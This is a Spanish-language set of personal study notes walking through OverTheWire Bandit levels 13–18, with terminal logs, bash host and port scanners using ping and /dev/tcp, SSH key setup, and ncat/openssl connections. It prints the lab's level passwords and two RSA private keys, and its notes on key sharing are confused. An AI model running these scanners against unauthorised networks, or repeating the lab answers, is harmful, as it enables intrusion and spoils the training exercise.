Type = gzip
Headers Size = 20

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38 .....           49           79  data9.bin
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38                 49           79  1 files
❯ 7z x data8.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 79 bytes (1 KiB)

Extracting archive: data8.bin
--
Path = data8.bin
Type = gzip
Headers Size = 20

Everything is Ok

Size:       49
Compressed: 79
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin   data5.bin   data6.bin   data9.bin         ize      test
 Desktop     HTB          Música     Público         Vídeos      data2     data4.bin   data6       data8.bin   decompressor.sh   prueba
❯ file data9.bin
data9.bin: ASCII text
❯ cat !$
cat data9.bin
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: data9.bin
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```


*Manejo de pares de claves y conexiones SSH*
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

bandit14@localhost: Permission denied (publickey).
bandit13@bandit:~$ cat sshkey.private
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==

bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p2220   //Estamos dentro

bandit14@bandit:~$ cat /etc/bandit_pass/bandit14  //La flag esta guardada aqui
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
bandit14@bandit:~$ exit
logout
Connection to localhost closed.
bandit14@bandit:~$ exit
logout
Connection to localhost closed.
bandit13@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.

sshpass -p 'fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq' ssh bandit14@bandit.labs.overthewire.org -p 2220
bandit14@bandit:~$

--------------------------------------------------------------------------------------------------
BREVE EXPLICACION SSH PARA CONECTARTE DESDE OTRO PC
--------------------------------------------------------------------------------------------------
❯ cd .ssh/
❯ sudo systemctl enable sshd
Failed to enable unit: Unit file sshd.service does not exist.
❯ sudo systemctl status sshd
Unit sshd.service could not be found.
❯ sudo systemctl enable ssh  // abilitando SSH
❯ sudo systemctl status sshd
○ ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: enabled)
     Active: inactive (dead)
       Docs: man:sshd(8)
             man:sshd_config(5)
❯ sudo systemctl start sshd
ssh k4rma@localhost   //En este caso me estoy conectando desde mi ordernador, pero si estuviese desde otro ordenador, localizar puertos abiertos y conectarse de alli
----------------------------------------------------
//PARA CONECTARTE SIN TENER QUE METER CREDENCIALES://
----------------------------------------------------
❯ cd .ssh/
❯ ls
 id_rsa   id_rsa.pub   known_hosts
❯ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/k4rma/.ssh/id_rsa):
/home/k4rma/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/k4rma/.ssh/id_rsa
Your public key has been saved in /home/k4rma/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:x45n1g/dcCTwxtYKpK78CSXVt+IPFZhRJ6O/ChxUqKE k4rma@parrot
The key's randomart image is:
+---[RSA 3072]----+
|           .=.+ .|
|        . .= O = |
|       . o+ * O o|
|      E .=   * * |
|        S * . * .|
|       . O + + = |
|        = B = o .|
|         * o *   |
|          o . o  |
+----[SHA256]-----+
❯ ls
 id_rsa   id_rsa.pub   known_hosts
❯ cat id_rsa
❯ cat id_rsa.pub
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa.pub
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWIQIqZ8UnbS6fuvzHftBf05n6P30PCGnXBZo5c5P7rfGSNcuYyQ7oTHExlKbQrt0Llg+ycEfzbTzZf26q+80Vj6IXQ1aDY5biPNEjwoHl3yqLVW16MB/SO/mspGZlxmVsdsjOsu
       │ UkZsj0aBM1E3ZhJ7e1Ap/OZyz4tChXVJv8N9AMhtT2ciOJUdg6aHI5GU5A9DriOmUwCZVEoZj5BfVy2lQS3pcSxn4czsDJkvIZR5+L+0uFaMri5lqQcGs/juZOBL43uvKOsKEYbopNLB/XLBFCcQvmVlDTxrH5lgEsgz6sCCX6YbVK
       │ H2Omz+tl8JtJOwXdUvSimyDSFLqlX0sFOpG3QXg4KQnoPlhuhpOQ3GEd8HFUuVyt56Kx9VrKo0X6ttnIs1lpd2fXEnR5Oee8uwDCoO57530SDwroV7kypNvtHdn8TRtRs+YOJevyGSXg/O/BPw6D5egpb71YI9xSwHfM+kSz5uZL1b
       │ WXiVZ/3HbfU+mKpFus3lD0blXDHQ0= k4rma@parrot
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cp id rsa.pub authorized_keys
cp: el objetivo 'authorized_keys' no es un directorio
❯ cp id_rsa.pub authorized_keys
❯ cat authorized_keys
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: authorized_keys
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWIQIqZ8UnbS6fuvzHftBf05n6P30PCGnXBZo5c5P7rfGSNcuYyQ7oTHExlKbQrt0Llg+ycEfzbTzZf26q+80Vj6IXQ1aDY5biPNEjwoHl3yqLVW16MB/SO/mspGZlxmVsdsjOsu
       │ UkZsj0aBM1E3ZhJ7e1Ap/OZyz4tChXVJv8N9AMhtT2ciOJUdg6aHI5GU5A9DriOmUwCZVEoZj5BfVy2lQS3pcSxn4czsDJkvIZR5+L+0uFaMri5lqQcGs/juZOBL43uvKOsKEYbopNLB/XLBFCcQvmVlDTxrH5lgEsgz6sCCX6YbVK
       │ H2Omz+tl8JtJOwXdUvSimyDSFLqlX0sFOpG3QXg4KQnoPlhuhpOQ3GEd8HFUuVyt56Kx9VrKo0X6ttnIs1lpd2fXEnR5Oee8uwDCoO57530SDwroV7kypNvtHdn8TRtRs+YOJevyGSXg/O/BPw6D5egpb71YI9xSwHfM+kSz5uZL1b
       │ WXiVZ/3HbfU+mKpFus3lD0blXDHQ0= k4rma@parrot
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ ssh k4rma@localhost
Linux parrot 6.0.0-12parrot1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.0.12-1parrot1 (2023-01-12) x86_64

************************************************************************************************************************************
Yo estoy en otro equipo y quiero conectarme sin proporcionar clave a este equipo:
1- Desde la maquina que quiere entrar --> ssh-keygen --> clave publica
2- La clave pública la incorpariamos a la maquina a donde vamos a acceder y guardarla como authorized_keys
3- Ahi entrariamos
----------------------------------------------------------------------------------------------------------------------------------------------------------
1- metiendo ssh-copy-id -i id_rsa k4rma@localhost (estariamos dando la clave privada)--> de esta forma estariamo convirtiendo esta clave a authorizes_keys
2- Compartiriamos este fichero a un tercero, cat authorized_keysat id_rsa
3- Este tercero : ssh - i  id_rsa k4rma@"puertoAbierto"
*************************************************************************************************************************************

❯ sudo systemctl stop sshd  //Para cerrar el servicio
[sudo] password for k4rma:

----------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 14->15 The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost
----------------------------------------------------------------------------------------------------------------------------------------------
Protocolos: TCP, UDP, etc..

bandit14@bandit:~$ nc localhost 30000
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq

Correct!
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
exit
bandit14@bandit:~$ exit
logout
There are stopped jobs.
bandit14@bandit:~$ logout
Connection to bandit.labs.overthewire.org closed.
```


*Uso de netcat para realizar conexiones*
```
❯ sshpass -p 'jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt' ssh bandit15@bandit.labs.overthewire.org -p 2220

-------------------------------------------------
EXPLICACIÓN DE PUERTOS ABIERTOS, SERVICIOS, ETC..
-------------------------------------------------

ss -nltp
State                Recv-Q                Send-Q                               Local Address:Port
         Peer Address:Port               Process
LISTEN               0                     244                                      127.0.0.1:5432
              0.0.0.0:*
LISTEN               0                     244                                          [::1]:5432
                 [::]:*
❯ sudo systemctl start sshd
[sudo] password for k4rma:
❯ ss -nltp
State                Recv-Q                Send-Q                               Local Address:Port
         Peer Address:Port               Process
LISTEN               0                     244                                      127.0.0.1:5432
              0.0.0.0:*
LISTEN               0                     128                                        0.0.0.0:22
              0.0.0.0:*
LISTEN               0                     128                                           [::]:22
                 [::]:*
LISTEN               0                     244                                          [::1]:5432
                 [::]:*
❯ cat /proc/net/tcp
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /proc/net/tcp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │   sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode

   2   │    0: 0100007F:1538 00000000:0000 0A 00000000:00000000 00:00000000 00000000   125        0 17214 1 0000000070753abb 99 0 0 10 0
   3   │    1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 408124 1 000000007970e41e 99 0 0 10 0
   4   │    2: 86EAA8C0:9362 E9BBBB36:01BB 01 00000000:00000000 02:000025D6 00000000  1000        0 231532 2 000000007203e8a9 20 3 31 10 -1
   5   │    3: 86EAA8C0:C91A 3202310D:08AC 01 00000000:00000000 02:000AC4EF 00000000  1000        0 402380 2 00000000b874abe9 20 3 30 10 -1
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

// Para pasar de Hexadecimal a numero
❯ python3.9
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0016
22
>>> 0x1538
5432
>>> 0x9362
37730
>>> 0xC91A
51482
>>>

❯ echo "1538
0016
9362" | sort -u
0016
1538
9362

❯ echo "1538
0016
9362" | while read line; do echo "Estamos leyendo la línea $line"; done
Estamos leyendo la línea 1538
Estamos leyendo la línea 0016
Estamos leyendo la línea 9362
❯ echo "1538
0016
9362" | while read line; do echo "[+] Puerto $line -> $(echo "obase=10; ibase=16; $line" | bc) - OPEN"; done
[+] Puerto 1538 -> 5432 - OPEN
[+] Puerto 0016 -> 22 - OPEN
[+] Puerto 9362 -> 37730 - OPEN
❯ echo; echo "1538
0016
9362" | while read line; do echo "[+] Puerto $line -> $(echo "obase=10; ibase=16; $line" | bc) - OPEN"; done

[+] Puerto 1538 -> 5432 - OPEN
[+] Puerto 0016 -> 22 - OPEN
[+] Puerto 9362 -> 37730 - OPEN

//Para listar servicios abiertos según el puerto
❯ sudo su
❯ lsof -i:22
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd    187745 root    3u  IPv4 408124      0t0  TCP *:ssh (LISTEN)
sshd    187745 root    4u  IPv6 407334      0t0  TCP *:ssh (LISTEN)
❯ lsof -i:37730
COMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
firefox-e 1944 k4rma   67u  IPv4 231532      0t0  TCP 192.168.234.134:37730->ec2-54-187-187-233.us-west-2.compute.amazonaws.com:https (ESTABLISHED)
❯ lsof -i:5432
COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres 899 postgres    5u  IPv6  17213      0t0  TCP localhost:postgresql (LISTEN)
postgres 899 postgres    6u  IPv4  17214      0t0  TCP localhost:postgresql (LISTEN)

//Listar todos los procesos del sistema //
❯ ps -faux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           2  0.0  0.0      0     0 ?        S    13:09   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   13:09   0:00  \_ [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   13:09   0:00  \_ [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   13:09   0:00  \_ [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   13:09   0:00  \_ [netns]
root           8  0.0  0.0      0     0 ?        I<   13:09   0:00  \_ [kworker/0:0H-events_highpri]
...

// Listar de forma especifica los comandos usados
ps -eo command
COMMAND
/sbin/init splash
[kthreadd]
[rcu_gp]
[rcu_par_gp]
[slub_flushwq]
[netns]
[kworker/0:0H-events_highpri]
[mm_percpu_wq]
....
```


*Uso de conexiones encriptadas*
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 15->16 : The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.

Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Para listar la ruta absoluta de un binario , si existe te reporta//
which nc
/usr/bin/nc
bandit15@bandit:~$ which ncat
/usr/bin/ncat
bandit15@bandit:~$ ncat --ssl 127.0.0.1 30001  // Ncat puede encriptar el tráfico usando SSL
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
Correct!
JQttfApK4SeyHwDlI9SXGR50qclOAil1

De otra forma:

bandit15@bandit:~$ openssl s_client -connect localhost:30001
---
read R BLOCK
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
Correct!
JQttfApK4SeyHwDlI9SXGR50qclOAil1

❯ sshpass -p 'JQttfApK4SeyHwDlI9SXGR50qclOAil1' ssh bandit16@bandit.labs.overthewire.org -p 2220
```


*Usando nuestros propios escaneres en Bash*

*hostScan.sh*
```
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  exit 1
}

# Ctrl+C
trap ctrl_c INT

for i in $(seq 1 254); do
  timeout 1 bash -c "ping -c 1 192.168.1.$i &>/dev/null" && echo "[+] Host 192.168.1.$i - ACTIVE" &
done; wait
```

*portScan.sh*
```
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT

tput civis # Ocultar el cursor
for port in $(seq 1 65535); do
  (echo '' > /dev/tcp/127.0.0.1/$port) 2>/dev/null && echo "[+] $port - OPEN" &
done; wait

# Recuperamos el cursor
tput cnorm
```

```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 16->17 : The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
❯ echo '' > /dev/tcp/127.0.0.1/22
zsh: no existe el fichero o el directorio: /dev/tcp/127.0.0.1/22
❯ bash
┌─[k4rma@parrot]─[~]
└──╼ $echo '' > /dev/tcp/127.0.0.1/22
┌─[k4rma@parrot]─[~]
└──╼ $echo$?
bash: echo0: orden no encontrada
┌─[✗]─[k4rma@parrot]─[~]
└──╼ $echo $?
127
┌─[k4rma@parrot]─[~]
└──╼ $echo '' > /dev/tcp/127.0.0.1/22
┌─[k4rma@parrot]─[~]
└──╼ $echo $?
0
┌─[k4rma@parrot]─[~]
└──╼ $echo '' > /dev/tcp/127.0.0.1/23
bash: connect: Conexión rehusada
bash: /dev/tcp/127.0.0.1/23: Conexión rehusada
┌─[✗]─[k4rma@parrot]─[~]
└──╼ $echo $?
1
┌─[k4rma@parrot]─[~]
└──╼ $kill %%
bash: kill: %%: no existe ese trabajo
┌─[✗]─[k4rma@parrot]─[~]
└──╼ $(echo '' > /dev/tcp/127.0.0.1/22) 2>/dev/null && "[+] El puerto está abierto" || echo "[+] El puerto está cerrado"
bash: [+] El puerto está abierto: orden no encontrada
[+] El puerto está cerrado
┌─[k4rma@parrot]─[~]
└──╼ $(echo '' > /dev/tcp/127.0.0.1/23) 2>/dev/null && "[+] El puerto está abierto" || echo "[+] El puerto está cerrado"
[+] El puerto está cerrado
┌─[k4rma@parrot]─[~]
└──╼ $(echo '' > /dev/tcp/127.0.0.1/22) 2>/dev/null && "[+] El puerto está abierto" || echo "[+] El puerto está cerrado"
bash: [+] El puerto está abierto: orden no encontrada
[+] El puerto está cerrado
┌─[k4rma@parrot]─[~]
└──╼ $(echo '' > /dev/tcp/127.0.0.1/22) 2>/dev/null && " echo [+] El puerto está abierto" || echo "[+] El puerto está cerrado"
bash:  echo [+] El puerto está abierto: orden no encontrada
[+] El puerto está cerrado
┌─[k4rma@parrot]─[~]
└──╼ $(echo '' > /dev/tcp/127.0.0.1/22) 2>/dev/null && echo "[+] El puerto está abierto" || echo "[+] El puerto está cerrado"
[+] El puerto está abierto
┌─[k4rma@parrot]─[~]
└──╼ $(echo '' > /dev/tcp/127.0.0.1/23) 2>/dev/null && echo "[+] El puerto está abierto" || echo "[+] El puerto está cerrado"
[+] El puerto está cerrado
--------------------------------------------------------------------------------------------------------
❯ sshpass -p 'JQttfApK4SeyHwDlI9SXGR50qclOAil1' ssh bandit16@bandit.labs.overthewire.org -p 2220
bandit16@bandit:~$ cd /tmp
bandit16@bandit:/tmp$ mktemp -d
/tmp/tmp.VxHtL2FDO5
bandit16@bandit:/tmp$ cd /tmp/tmp.VxHtL2FDO5
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ export TERM=xterm
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ touch portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ nano portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ nano portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ chmod +x portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ ls -l
total 4
-rwxrwxr-x 1 bandit16 bandit16 224 Jan 23 16:53 portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ ./portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ ./portScan.sh
[+] 31046 - OPEN
[+] 31518 - OPEN
[+] 31691 - OPEN
[+] 31790 - OPEN
[+] 31960 - OPEN
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ ncat --ssl 127.0.0.1 31790
JQttfApK4SeyHwDlI9SXGR50qclOAil1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ exit
logout
Connection to bandit.labs.overthewire.org closed.

❯ sshpass -p 'JQttfApK4SeyHwDlI9SXGR50qclOAil1' ssh bandit16@bandit.labs.overthewire.org -p 2220
bandit16@bandit:~$ cd /tmp/tmp.VxHtL2FDO5
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ export TERM=xterm
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ nano id_rsa
Unable to create directory /home/bandit16/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ nano id_rsa
Unable to create directory /home/bandit16/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ ls -l
total 8
-rw-rw-r-- 1 bandit16 bandit16 1675 Jan 23 16:59 id_rsa
-rwxrwxr-x 1 bandit16 bandit16  224 Jan 23 16:53 portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ chmod 600 id_rsa
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ ls -l
total 8
-rw------- 1 bandit16 bandit16 1675 Jan 23 16:59 id_rsa
-rwxrwxr-x 1 bandit16 bandit16  224 Jan 23 16:53 portScan.sh
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ ssh -i id_rsa bandit17@bandit.labs.overthewire.org -p2220

bandit17@bandit:~$ ls -l /etc/bandit_pass/
total 136
-r-------- 1 bandit0  bandit0   8 Jan 11 19:18 bandit0
-r-------- 1 bandit1  bandit1  33 Jan 11 19:18 bandit1
-r-------- 1 bandit10 bandit10 33 Jan 11 19:18 bandit10
-r-------- 1 bandit11 bandit11 33 Jan 11 19:18 bandit11
-r-------- 1 bandit12 bandit12 33 Jan 11 19:18 bandit12
-r-------- 1 bandit13 bandit13 33 Jan 11 19:18 bandit13
-r-------- 1 bandit14 bandit14 33 Jan 11 19:18 bandit1
bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e
bandit17@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
bandit16@bandit:/tmp/tmp.VxHtL2FDO5$ logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e' ssh bandit17@bandit.labs.overthewire.org -p 2220
```



*Detección de diferencias entre archivos*
-  Comparar las diferencias con el comando diff: [https://eltallerdelbit.com/comando-diff-ejemplos/](https://eltallerdelbit.com/comando-diff-ejemplos/)
```
 ---------------------------------------------------------------------------------------------------------------
 BANDIT 17-18 : There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new

NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19
--------------------------------------------------------------------------------------------------------------------------------------
bandit17@bandit:~$ ls
passwords.new  passwords.old
bandit17@bandit:~$ wc -l *
 100 passwords.new
 100 passwords.old
 200 total
 bandit17@bandit:~$ cat passwords.old | head -n 5
T2EKnlGM58236UTzM4BWH7gvpuh7Lr9o
x5SNiYaBDbuvnMsCaCGy1lmz2VAISLSH
JE5YLIiRqiT9zdiHy3lcGYZbuXZX6KOg
pKUpVHvaRf6rCn62H2Xf9xJqVszYidZH
riOYKjlMmtbzpV8EgWvHtcdoNplo2wue
bandit17@bandit:~$ cat passwords.new | head -n 5
T2EKnlGM58236UTzM4BWH7gvpuh7Lr9o
x5SNiYaBDbuvnMsCaCGy1lmz2VAISLSH
JE5YLIiRqiT9zdiHy3lcGYZbuXZX6KOg
pKUpVHvaRf6rCn62H2Xf9xJqVszYidZH
riOYKjlMmtbzpV8EgWvHtcdoNplo2wue
bandit17@bandit:~$ ls
passwords.new  passwords.old
bandit17@bandit:~$ diff passwords.old passwords.new
42c42
< 810zq8IK64u5A9Lb2ibdTGBtlcSZsoe8
---
> hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

❯ sshpass -p 'hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg' ssh bandit18@bandit.labs.overthewire.org -p 2220
```


*Ejecución de comandos SSH*
```
